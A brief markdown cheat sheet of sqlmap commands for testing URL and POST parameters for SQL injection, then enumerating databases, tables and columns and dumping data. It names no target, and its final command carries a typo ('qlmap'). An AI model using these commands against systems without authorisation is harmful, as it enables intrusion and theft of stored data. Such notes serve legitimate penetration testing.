# sqlmap

## Scanning

```
sqlmap -u <url> -p <param>
sqlmap -u <url> -p <param> -v3
sqlmap -u <url> -p <param> --flush-session #forget previous results
```

### Post request

```
sqlmap -u <url> --data='<post body>' -p <param>
sqlmap -r <path to .req file> -p <param>
```

### Configure technique

```
sqlmap -u <url>?<param to test>=<value> -p <param> --technique <tech>
```

## Post exploitation

```
sqlmap -u <url> -p <param> --banner --fresh-queries
sqlmap -u <url> -p <param> --dbs
```

### Database enumeration

```
sqlmap -u <url> -p <param> -D <db> --tables
sqlmap -u <url> -p <param> -D <db> -T <table> --columns
```

### Dump

```
qlmap -u <url> -p <param> -D <db> -T <table> -C <col1,col2...> --dump
```
